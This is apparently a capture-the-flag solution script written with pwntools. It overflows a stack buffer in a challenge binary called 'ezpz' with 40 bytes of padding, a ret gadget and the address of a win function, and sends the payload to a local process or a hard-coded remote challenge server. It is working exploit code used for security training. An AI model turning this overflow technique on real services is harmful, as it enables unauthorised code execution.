#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("ezpz")

# Defining the GDB script that will be used when running the
# binary
gs = '''
continue
'''

# Launch the binary with GDB, without GDB or REMOTE based on
# the command-line arguments
def start():
    if args.REMOTE:
        return remote("3.110.66.92", 31636)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

#============================================================
#                    EXPLOIT GOES HERE
#============================================================

# Find a ret gadget
ret = asm('ret')
ret = next(elf.search(ret))

# ret address is a padding to avoid stack alignment issues and
# the main function allows the program to print the flag remotely
payload = b"A"*40 + p64(ret) + p64(elf.sym.win) + p64(elf.sym.main)

# Send the payload
io.sendline(payload)

#============================================================

# Interact with the process
io.interactive()